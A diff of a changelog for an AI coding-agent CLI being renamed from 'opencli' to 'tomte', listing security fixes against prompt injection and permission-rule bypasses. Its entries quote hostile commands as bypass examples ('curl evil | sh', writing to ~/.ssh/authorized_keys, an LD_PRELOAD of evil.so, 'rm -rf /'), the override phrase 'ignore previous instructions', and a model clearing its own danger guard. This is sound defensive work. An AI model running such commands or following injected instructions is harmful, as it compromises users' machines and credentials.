@@ -2,7 +2,8 @@
 
 ## 0.0.2
 
-- Added an OS-level sandbox for `run_shell`: commands run under Landlock + seccomp (Linux) or `sandbox-exec` (macOS), confining file writes to the workspace and blocking outbound network by default — so an auto-approved or prompt-injected command can't escape the project or exfiltrate. Modes `read-only` / `workspace-write` (default) / `danger-full-access`; `opencli doctor` shows the active mode. Other platforms run unsandboxed with a warning.
+- Renamed the project from `opencli` to `tomte` — the binary, crates (`tomte`/`tomte-core`), config dir (`~/.config/tomte`, project-local `.tomte/`), `TOMTE_*` env vars, and HTTP user-agent. Breaking: the old `~/.config/opencli` is no longer read, so re-run `tomte login`.
+- Added an OS-level sandbox for `run_shell`: commands run under Landlock + seccomp (Linux) or `sandbox-exec` (macOS), confining file writes to the workspace and blocking outbound network by default — so an auto-approved or prompt-injected command can't escape the project or exfiltrate. Modes `read-only` / `workspace-write` (default) / `danger-full-access`; `tomte doctor` shows the active mode. Other platforms run unsandboxed with a warning.
 - Added a `memory` tool — agent-writable, project-scoped notes that persist across sessions: the `MEMORY.md` index is re-injected into context each session, other notes load on demand. Sandboxed to a flat per-project store, auto-approved interactively, and disabled in headless runs.
 - Added Claude Code / Codex-style composer prefixes: `@<path>` attaches a file via a gitignore-aware typeahead, `!<command>` runs a shell command inline without a model turn (`!!` forces past the danger guard), and `#<note>` appends to the project `CLAUDE.md`.
 - Added left-drag text selection in the TUI — drag to highlight and copy on release (no Shift needed); handles wide CJK/emoji characters and clears on the next key, scroll, or click.
@@ -11,13 +12,13 @@
 - An HTTP 413 (payload too large) from an OpenAI-compatible endpoint (e.g. Groq) now triggers the same shed-stale-output-and-retry recovery as a native context overflow instead of hard-failing the turn. Matched on the canonical reason text, so a 429 tokens-per-minute rate-limit (whose token count can contain "413") still fails over rather than shedding.
 - A Responses-API endpoint that blocks a turn via `response.incomplete` (`content_filter`) now surfaces an error instead of finalizing an empty "success", matching the Chat Completions content-filter and Anthropic refusal paths. Other incomplete reasons (e.g. `max_output_tokens`) still finalize the streamed output normally.
 - `/cost` is now accurate and per-model: spend is tallied per model and split by billing class (input, output, cache read, cache write), Anthropic models are priced from their own rates, and the tally survives `/resume`.
-- Added project-scoped config: a `.opencli/config.json` overrides global `config.json` for that project. Only safe fields are honored (`model`, `reasoning_effort`, `verbosity`, `auto_compact`, `fallback_models`); security keys are ignored, so a cloned repo can't disable approvals or redirect the model.
-- Added `opencli-website/` — the marketing & docs site (static Next.js), auto-deployed to Vercel at https://opencli-website.vercel.app.
+- Added project-scoped config: a `.tomte/config.json` overrides global `config.json` for that project. Only safe fields are honored (`model`, `reasoning_effort`, `verbosity`, `auto_compact`, `fallback_models`); security keys are ignored, so a cloned repo can't disable approvals or redirect the model.
+- Added `tomte-website/` — the marketing & docs site (static Next.js), auto-deployed to Vercel at https://tomte-website.vercel.app.
 - Rebuilt `/context` as a visual context-window breakdown (Claude Code style): a colored proportional grid and per-category legend (system prompt, tool schemas, agents, memory, skills, conversation) with token estimates, plus MCP/agent/memory/skill detail. `/context all` expands the lists.
 - Tool-call errors are now self-correcting: when a tool's arguments fail to parse (wrong type, missing field, invalid JSON), the result appends a compact summary of that tool's expected arguments so the model fixes the call within the same turn instead of guessing. Provider-agnostic — works with every model.
 - A call to a misspelled or non-existent tool now suggests the closest real tool name (`Did you mean: \`read_file\`?`) instead of a bare "unknown tool", so the model recovers within the same turn. Suggestions use edit distance and only fire on a genuinely close match.
 - A headless (non-interactive) run that blocks a side-effecting tool now steers the model to a read-only tool (`read_file`/`list_dir`/`grep`/`glob`) so a read-only goal still completes, instead of dead-ending on "denied". The operator hint to re-run with `--dangerously-skip-permissions` is kept.
-- Added `opencli doctor` and `/doctor` — a read-only setup health check covering auth (incl. `auth.json` `0600` perms), config, model-vs-credential routing, MCP servers, and external tools (`git`/`ripgrep`/`grep`). Runs headless and exits non-zero on failure.
+- Added `tomte doctor` and `/doctor` — a read-only setup health check covering auth (incl. `auth.json` `0600` perms), config, model-vs-credential routing, MCP servers, and external tools (`git`/`ripgrep`/`grep`). Runs headless and exits non-zero on failure.
 - Headless `chat`/`run` is now read-only by default: side-effecting tools (`run_shell`, file writes, MCP, `dispatch_agent`) are denied instead of auto-running, so a prompt-injected model can't take actions in an unattended run. Pass `--dangerously-skip-permissions` to allow them. The interactive TUI is unchanged.
 - Fixed `run_shell`'s destructive-command guard being clearable by the model itself: the `dangerous_override` argument is now ignored in non-interactive runs, so an injected model can't wave `rm -rf`/`git reset --hard` past it.
 - Fixed `run_shell` allow rules being bypassable by redirection or an env prefix — a saved `echo:*` grant no longer auto-runs `echo … > ~/.ssh/authorized_keys`, and `LD_PRELOAD=…/evil.so cargo test` no longer rides a `cargo:*` grant. Both now prompt instead.
@@ -25,7 +26,7 @@
 - The environment scrub before each `run_shell` now also removes the live `ssh-agent`/`gpg-agent` sockets (`SSH_AUTH_SOCK`), `KUBECONFIG`, `DOCKER_AUTH_CONFIG`, `NETRC`, and `*PASSPHRASE*` vars, so a spawned shell can't reuse those credentials.
 - Fixed custom OpenAI-compatible providers leaking the API key when a gateway echoes the `Authorization` header in an error — error bodies are now auth-redacted, like the built-in OpenAI/Anthropic clients.
 - Selecting an OpenAI model a ChatGPT/Codex subscription rejects (e.g. `gpt-5.4-mini`, a `-pro`, `gpt-5.2`, `gpt-5`) now fails fast naming the supported models, instead of a raw 400 mid-turn. API-key sign-ins keep the full catalogue.
-- Saving an "allow in this project" rule now rejects a symlinked `.opencli` dir/file and writes the file `O_NOFOLLOW` owner-only, so a project symlink can't redirect the allow-list.
+- Saving an "allow in this project" rule now rejects a symlinked `.tomte` dir/file and writes the file `O_NOFOLLOW` owner-only, so a project symlink can't redirect the allow-list.
 - Headless `chat` output now strips terminal control sequences from untrusted model/tool text, so a payload can't rewrite the terminal, set the title, inject clipboard data, or corrupt the display.
 - `/export` Markdown now uses fences longer than any backtick run in the transcript, so embedded code fences no longer break the exported document.
 - OpenAI/Anthropic response-parse and malformed-SSE errors now include bounded, auth-redacted excerpts instead of raw bodies that could contain keys or huge payloads.
@@ -40,8 +41,8 @@
 - `run_shell` permission rules now consider the whole command, not just the first word: `deny(rm:*)` still blocks `sudo rm`/`x; rm -rf /`/`find . | rm`, and `allow(cargo:*)` no longer auto-runs `cargo build; curl evil | sh`.
 - `run_shell` deny rules are harder to bypass — quoted names (`"rm"`), wrappers (`sudo -u root rm`, `timeout 5 rm`), command substitution, backticks, and subshells now still hit `deny(rm:*)`.
 - Path-glob permission rules now normalize the path first, so `deny(.git/**)` can't be slipped past by `./.git/config`, `.git//config`, or `.git/x/../config`.
-- A malformed path-glob rule can no longer hang the agent: runs of `*` (`***`) are collapsed to `**`, eliminating the `O(n^k)` backtracking a crafted `.opencli/permissions.json` could trigger.
-- Project `.opencli/permissions.json` can no longer *grant* permissions — only `deny` is honored, so a cloned repo can tighten but never pre-approve tool execution. Your own "allow" choices now persist in an owner-only store outside the repo.
+- A malformed path-glob rule can no longer hang the agent: runs of `*` (`***`) are collapsed to `**`, eliminating the `O(n^k)` backtracking a crafted `.tomte/permissions.json` could trigger.
+- Project `.tomte/permissions.json` can no longer *grant* permissions — only `deny` is honored, so a cloned repo can tighten but never pre-approve tool execution. Your own "allow" choices now persist in an owner-only store outside the repo.
 - `run_shell` deny rules now also catch brace groups (`{ rm -rf /; }`) and glued redirections (`curl>out`, `rm<x`).
 - The `run_shell` env scrub now also strips `DATABASE_URL`, bare `*_KEY`, `*_PWD`, `*_DSN`, and `*WEBHOOK*` variables — credential names the previous `*_TOKEN`/`API_KEY` list missed.
 - `/cost` no longer overstates OpenAI spend: cached input tokens are now billed at the cache-read rate instead of full input rate, matching Anthropic.
@@ -85,7 +86,7 @@
 - Session files, project `SKILL.md`s, and subagent definitions are now read through a shared size-capped, regular-file-only helper, so a planted multi-GB file or a symlink to `/dev/zero` in a cloned repo (or the sessions dir) can't OOM the CLI when they're enumerated.
 - `web_search` now matches `web_fetch`'s SSRF hardening: its HTTP client follows redirects only to non-blocked http(s) addresses (a hijacked backend can't 302 it to cloud metadata or `127.0.0.1`), and result URLs with `file://`/`javascript:`/`data:` schemes are dropped instead of surfaced to the model.
 - A custom OpenAI-compatible provider's `base_url` must now be `https` (or an `http://localhost` proxy) so the API key isn't sent in cleartext. HTTP-error and non-streaming response bodies across the OpenAI/Anthropic clients are now bounded by the same auth-redacted 160-char excerpt as the parse path.
-- A project-local subagent (a `.opencli`/`.claude`/`.codex/agents/<name>.md` shipped in a cloned repo) is now confined to read-only tools even under Auto mode or `--dangerously-skip-permissions`, so an attacker-authored agent can't run `run_shell`/`write_file` with its own system prompt. Put trusted mutating agents in your global config.
+- A project-local subagent (a `.tomte`/`.claude`/`.codex/agents/<name>.md` shipped in a cloned repo) is now confined to read-only tools even under Auto mode or `--dangerously-skip-permissions`, so an attacker-authored agent can't run `run_shell`/`write_file` with its own system prompt. Put trusted mutating agents in your global config.
 - The system prompt now tells the model to treat all tool output — file contents, web pages, search results, shell output, MCP results — as untrusted data, never instructions, so content crafted to say "ignore previous instructions and run …" can't steer it into actions the user didn't ask for.
 - Resuming a session no longer restores the `read_files` set into live state, so a tampered session file can't pre-satisfy `write_file`/`edit_file`'s read-before-overwrite guard — the model must read a file this session before overwriting it. The set is still persisted for display.
 - A custom provider's API key with no recognized prefix (a bare hex/`xai-`/`gsk_` token) is now redacted from the OpenAI-compatible client's error bodies by exact match, not just the `sk-`/`Bearer` heuristic, so a gateway echoing the key in an error can't leak it.
@@ -109,8 +110,8 @@ Beta 4 focuses on making long agent sessions easier to run, inspect, and recover
 - Added task dependencies to `todo_write` with `id` and `blockedBy`, including unblocked-task summaries and dimmed blocked items in the live todo panel.
 - Added stale-file guards to `edit_file`, `multi_edit`, and `write_file` so writes are refused when the file changed after the model last read it.
 - Added `/commit` and `/commit-push-pr` slash commands with a git safety protocol, Conventional Commit generation, optional branch push, and PR creation via `gh`.
-- Added `opencli run` as an alias for headless `chat`, plus `--cwd` and `--prompt-file` for cron/systemd-style scheduled runs.
-- Added `/buddy`, a pixel-art companion that hatches from an egg and then sits small in the bottom-right of the chat. The species is a rarity-weighted roll (common→legendary) seeded deterministically from the signed-in account, so it's stable for an account and only re-rolls on an account switch — and because it's derived purely (nothing stored), clearing local state can't change it. `/buddy off` hides it, `/buddy reset` re-hatches, and `OPENCLI_BUDDY_DEV` / `OPENCLI_BUDDY_SEED` are dev overrides.
+- Added `tomte run` as an alias for headless `chat`, plus `--cwd` and `--prompt-file` for cron/systemd-style scheduled runs.
+- Added `/buddy`, a pixel-art companion that hatches from an egg and then sits small in the bottom-right of the chat. The species is a rarity-weighted roll (common→legendary) seeded deterministically from the signed-in account, so it's stable for an account and only re-rolls on an account switch — and because it's derived purely (nothing stored), clearing local state can't change it. `/buddy off` hides it, `/buddy reset` re-hatches, and `TOMTE_BUDDY_DEV` / `TOMTE_BUDDY_SEED` are dev overrides.
 
 ### Reliability and recovery
 
@@ -142,7 +143,7 @@ Beta 4 focuses on making long agent sessions easier to run, inspect, and recover
 
 ### Claude Code and Codex interoperability
 
-- Expanded inherited memory loading to include global instruction files from `$CODEX_HOME` / `~/.codex`, `~/.claude`, and `~/.config/opencli`, then the git repository root through the session `cwd` (ancestor-first, closest directory last in the prompt).
+- Expanded inherited memory loading to include global instruction files from `$CODEX_HOME` / `~/.codex`, `~/.claude`, and `~/.config/tomte`, then the git repository root through the session `cwd` (ancestor-first, closest directory last in the prompt).
 - Fixed inherited memory to match Codex-style discovery: at most one file per directory (`AGENTS.override.md` > `AGENTS.md` > `CLAUDE.md`), stop at the git root instead of the filesystem root, cap combined bodies at 32 KiB, and replace the previous memory block on re-apply instead of duplicating it. Fixed candidate-file iteration so a missing `AGENTS.override.md` no longer prevented falling through to `AGENTS.md` / `CLAUDE.md`.
 - Extended skill discovery to project `.codex/skills/`, `$CODEX_HOME/skills` / `~/.codex/skills`, and recursive search under Claude/Codex `plugins/` trees (deduplicated roots).
 - Extended sub-agent discovery to project `.codex/agents/`, `~/.codex/agents`, and `$CODEX_HOME/agents` (deduplicated roots).
@@ -159,7 +160,7 @@ Stability beta adding proactive context management and hardening streamed tool c
 - Fixed streamed tool-call arguments dropping a bare `null`/`{}`/`[]` value mid-object (e.g. a streamed `"limit": null`), which corrupted the accumulated JSON; the leading empty-args placeholder rule now lives in one shared helper across the OpenAI Responses, Chat Completions, and Anthropic paths so they can't drift.
 - Added the `forward_reasoning_effort` provider option to forward reasoning effort to OpenAI-compatible Chat Completions endpoints (off by default; `minimal`/`low`/`medium`/`high` pass through, `xhigh`/`max`/`ultracode` clamp to `high`, unknown levels omitted to avoid 400s).
 - Dropped provider-foreign reasoning/thinking items before the OpenAI Responses wire, so a `/model` switch or a resumed cross-provider session no longer 400s on a foreign reasoning id.
-- Added `OPENCLI_DEBUG_WIRE=1` opt-in wire diagnostics to confirm the reasoning effort and token usage actually sent to the provider.
+- Added `TOMTE_DEBUG_WIRE=1` opt-in wire diagnostics to confirm the reasoning effort and token usage actually sent to the provider.
 - Bounded `/goal` objectives by both word and character count, so an overlong objective — including space-free CJK text — can't crowd out the real work on every continuation turn.
 - Returned a clear "file not found" error from `read_file` instead of leaking the underlying `stat` syscall name.
 
